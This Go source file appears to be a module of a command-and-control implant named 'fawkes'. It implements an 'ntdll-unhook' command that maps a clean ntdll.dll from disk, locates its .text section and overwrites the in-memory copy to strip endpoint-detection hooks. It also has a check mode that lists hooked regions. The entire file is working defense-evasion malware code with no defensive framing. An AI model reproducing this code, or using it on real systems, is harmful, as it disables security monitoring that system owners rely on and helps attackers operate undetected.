//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"runtime"
	"strings"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"
)

// ntdll unhooking: read clean ntdll.dll from disk, replace hooked .text section in memory

// New kernel32 procs needed for file mapping
var (
	procCreateFileMappingW = kernel32.NewProc("CreateFileMappingW")
	procMapViewOfFile      = kernel32.NewProc("MapViewOfFile")
	procUnmapViewOfFile    = kernel32.NewProc("UnmapViewOfFile")
	procVirtualProtectUH   = kernel32.NewProc("VirtualProtect")
)

// File mapping constants
const (
	genericRead  = 0x80000000
	openExisting = 3
	pageReadonly = 0x02
	secImage     = 0x1000000 // Map file as PE image (applies section alignment)
	fileMapRead  = 0x0004
)

// PE header structures for parsing
type imageDOSHeader struct {
	EMagic  uint16     // Must be 0x5A4D ("MZ")
	_       [29]uint16 // Padding
	ELfanew int32      // Offset to PE signature
}

type imageFileHeader struct {
	Machine              uint16
	NumberOfSections     uint16
	TimeDateStamp        uint32
	PointerToSymbolTable uint32
	NumberOfSymbols      uint32
	SizeOfOptionalHeader uint16
	Characteristics      uint16
}

type imageSectionHeader struct {
	Name                 [8]byte
	VirtualSize          uint32
	VirtualAddress       uint32
	SizeOfRawData        uint32
	PointerToRawData     uint32
	PointerToRelocations uint32
	PointerToLinenumbers uint32
	NumberOfRelocations  uint16
	NumberOfLinenumbers  uint16
	Characteristics      uint32
}

// NtdllUnhookCommand implements the ntdll-unhook command
type NtdllUnhookCommand struct{}

func (c *NtdllUnhookCommand) Name() string {
	return "ntdll-unhook"
}

func (c *NtdllUnhookCommand) Description() string {
	return "Remove EDR hooks from ntdll.dll by restoring the .text section from disk"
}

type ntdllUnhookArgs struct {
	Action string `json:"action"` // unhook, check
}

func (c *NtdllUnhookCommand) Execute(task structs.Task) structs.CommandResult {
	if runtime.GOOS != "windows" {
		return structs.CommandResult{
			Output:    "Error: This command is only supported on Windows",
			Status:    "error",
			Completed: true,
		}
	}

	var args ntdllUnhookArgs
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &args); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	if args.Action == "" {
		args.Action = "unhook"
	}

	switch strings.ToLower(args.Action) {
	case "unhook":
		output, err := PerformUnhookNtdll()
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "success",
			Completed: true,
		}

	case "check":
		output, err := checkNtdllHooks()
		if err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
		return structs.CommandResult{
			Output:    output,
			Status:    "success",
			Completed: true,
		}

	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action: %s. Use: unhook, check", args.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// PerformUnhookNtdll reads a clean copy of ntdll.dll from disk and overwrites
// the in-memory .text section, removing any EDR inline hooks.
// Exported so other commands (e.g., start-clr) can call it.
func PerformUnhookNtdll() (string, error) {
	var output string
	output += "[*] ntdll.dll Unhooking\n"

	// Step 1: Get in-memory base address of ntdll.dll
	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
	if ntdllBase == 0 {
		return "", fmt.Errorf("GetModuleHandleW(ntdll.dll) failed")
	}
	output += fmt.Sprintf("[*] In-memory ntdll base: 0x%X\n", ntdllBase)

	// Step 2: Open a clean copy from disk
	ntdllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\ntdll.dll`)
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(ntdllPath)),
		uintptr(genericRead),
		uintptr(FILE_SHARE_READ),
		0,
		uintptr(openExisting),
		0,
		0,
	)
	invalidHandle := ^uintptr(0)
	if hFile == invalidHandle {
		return "", fmt.Errorf("CreateFileW failed: %v", err)
	}
	defer procCloseHandle.Call(hFile)

	// Step 3: Create file mapping with SEC_IMAGE flag
	// SEC_IMAGE causes Windows to map the file as a PE image with proper section alignment
	hMapping, _, err := procCreateFileMappingW.Call(
		hFile,
		0,
		uintptr(pageReadonly|secImage),
		0,
		0,
		0,
	)
	if hMapping == 0 {
		return "", fmt.Errorf("CreateFileMappingW failed: %v", err)
	}
	defer procCloseHandle.Call(hMapping)

	// Step 4: Map the clean copy into our address space
	mappedBase, _, err := procMapViewOfFile.Call(
		hMapping,
		uintptr(fileMapRead),
		0, 0, 0,
	)
	if mappedBase == 0 {
		return "", fmt.Errorf("MapViewOfFile failed: %v", err)
	}
	defer procUnmapViewOfFile.Call(mappedBase)
	output += fmt.Sprintf("[*] Clean ntdll mapped at: 0x%X\n", mappedBase)

	// Step 5: Parse PE headers to find .text section
	textSection, err := findTextSection(mappedBase)
	if err != nil {
		return "", fmt.Errorf("PE parsing failed: %v", err)
	}

	textVA := uintptr(textSection.VirtualAddress)
	textSize := uintptr(textSection.SizeOfRawData)
	output += fmt.Sprintf("[*] .text section: RVA=0x%X, Size=%d bytes\n", textVA, textSize)

	cleanTextAddr := mappedBase + textVA
	hookedTextAddr := ntdllBase + textVA

	// Step 6: VirtualProtect the hooked .text to PAGE_EXECUTE_READWRITE
	var oldProtect uint32
	ret, _, err := procVirtualProtectUH.Call(
		hookedTextAddr,
		textSize,
		uintptr(PAGE_EXECUTE_READWRITE),
		uintptr(unsafe.Pointer(&oldProtect)),
	)
	if ret == 0 {
		return "", fmt.Errorf("VirtualProtect (RWX) failed: %v", err)
	}

	// Step 7: Copy clean .text over hooked .text
	cleanSlice := unsafe.Slice((*byte)(unsafe.Pointer(cleanTextAddr)), textSize)
	hookedSlice := unsafe.Slice((*byte)(unsafe.Pointer(hookedTextAddr)), textSize)
	bytesCopied := copy(hookedSlice, cleanSlice)

	// Step 8: Restore original memory protection
	var discardProtect uint32
	procVirtualProtectUH.Call(
		hookedTextAddr,
		textSize,
		uintptr(oldProtect),
		uintptr(unsafe.Pointer(&discardProtect)),
	)

	output += fmt.Sprintf("[+] Restored %d bytes of .text section\n", bytesCopied)
	output += "[+] ntdll.dll successfully unhooked — all inline hooks removed"

	return output, nil
}

// findTextSection parses PE headers starting from mappedBase and returns the .text section header
func findTextSection(baseAddr uintptr) (*imageSectionHeader, error) {
	// Validate DOS header magic
	dosHeader := (*imageDOSHeader)(unsafe.Pointer(baseAddr))
	if dosHeader.EMagic != 0x5A4D {
		return nil, fmt.Errorf("invalid DOS header magic: 0x%X", dosHeader.EMagic)
	}

	// Navigate to NT headers
	ntHeadersAddr := baseAddr + uintptr(dosHeader.ELfanew)

	// Validate PE signature
	peSignature := *(*uint32)(unsafe.Pointer(ntHeadersAddr))
	if peSignature != 0x00004550 {
		return nil, fmt.Errorf("invalid PE signature: 0x%X", peSignature)
	}

	// Parse file header (starts at PE signature + 4)
	fileHeader := (*imageFileHeader)(unsafe.Pointer(ntHeadersAddr + 4))
	numSections := fileHeader.NumberOfSections
	sizeOfOptionalHeader := fileHeader.SizeOfOptionalHeader

	// Section headers start after: PE signature (4) + FileHeader (20) + OptionalHeader
	sectionHeadersAddr := ntHeadersAddr + 4 + 20 + uintptr(sizeOfOptionalHeader)

	// Walk section headers to find .text
	for i := uint16(0); i < numSections; i++ {
		section := (*imageSectionHeader)(unsafe.Pointer(
			sectionHeadersAddr + uintptr(i)*40, // each section header is 40 bytes
		))
		name := string(section.Name[:])
		if strings.HasPrefix(name, ".text") {
			return section, nil
		}
	}

	return nil, fmt.Errorf(".text section not found in %d sections", numSections)
}

// checkNtdllHooks compares the in-memory ntdll .text section with the on-disk copy
// and reports any differences (potential hooks)
func checkNtdllHooks() (string, error) {
	var output string
	output += "[*] Checking ntdll.dll for inline hooks...\n"

	// Get in-memory base
	ntdllName, _ := syscall.UTF16PtrFromString("ntdll.dll")
	ntdllBase, _, _ := procGetModuleHandleW.Call(uintptr(unsafe.Pointer(ntdllName)))
	if ntdllBase == 0 {
		return "", fmt.Errorf("GetModuleHandleW(ntdll.dll) failed")
	}

	// Map clean copy
	ntdllPath, _ := syscall.UTF16PtrFromString(`C:\Windows\System32\ntdll.dll`)
	hFile, _, err := procCreateFileW.Call(
		uintptr(unsafe.Pointer(ntdllPath)),
		uintptr(genericRead), uintptr(FILE_SHARE_READ), 0, uintptr(openExisting), 0, 0,
	)
	invalidHandle := ^uintptr(0)
	if hFile == invalidHandle {
		return "", fmt.Errorf("CreateFileW failed: %v", err)
	}
	defer procCloseHandle.Call(hFile)

	hMapping, _, err := procCreateFileMappingW.Call(hFile, 0, uintptr(pageReadonly|secImage), 0, 0, 0)
	if hMapping == 0 {
		return "", fmt.Errorf("CreateFileMappingW failed: %v", err)
	}
	defer procCloseHandle.Call(hMapping)

	mappedBase, _, err := procMapViewOfFile.Call(hMapping, uintptr(fileMapRead), 0, 0, 0)
	if mappedBase == 0 {
		return "", fmt.Errorf("MapViewOfFile failed: %v", err)
	}
	defer procUnmapViewOfFile.Call(mappedBase)

	// Find .text section
	textSection, err := findTextSection(mappedBase)
	if err != nil {
		return "", err
	}

	textVA := uintptr(textSection.VirtualAddress)
	textSize := uintptr(textSection.SizeOfRawData)

	cleanText := unsafe.Slice((*byte)(unsafe.Pointer(mappedBase+textVA)), textSize)
	hookedText := unsafe.Slice((*byte)(unsafe.Pointer(ntdllBase+textVA)), textSize)

	// Compare and find differences
	hookCount := 0
	var hooks []string
	const maxHooksToReport = 20

	i := uintptr(0)
	for i < textSize {
		if cleanText[i] != hookedText[i] {
			hookCount++
			// Find the extent of this hook (contiguous modified bytes)
			hookStart := i
			for i < textSize && cleanText[i] != hookedText[i] {
				i++
			}
			hookLen := i - hookStart
			hookAddr := ntdllBase + textVA + hookStart

			if len(hooks) < maxHooksToReport {
				// Show first few bytes of original and hooked
				origBytes := make([]byte, minUintptr(hookLen, 8))
				hookBytes := make([]byte, minUintptr(hookLen, 8))
				copy(origBytes, cleanText[hookStart:])
				copy(hookBytes, hookedText[hookStart:])
				hooks = append(hooks, fmt.Sprintf("  0x%X (%d bytes): %X → %X",
					hookAddr, hookLen, origBytes, hookBytes))
			}
		} else {
			i++
		}
	}

	if hookCount == 0 {
		output += "[+] No hooks detected — ntdll.dll .text section matches disk copy\n"
		output += fmt.Sprintf("[*] Compared %d bytes\n", textSize)
	} else {
		output += fmt.Sprintf("[!] Found %d hooked regions in .text section (%d bytes)\n\n", hookCount, textSize)
		for _, h := range hooks {
			output += h + "\n"
		}
		if hookCount > maxHooksToReport {
			output += fmt.Sprintf("  ... and %d more\n", hookCount-maxHooksToReport)
		}
		output += "\n[*] Run 'ntdll-unhook' (action=unhook) to restore clean .text section"
	}

	return output, nil
}

func minUintptr(a, b uintptr) uintptr {
	if a < b {
		return a
	}
	return b
}
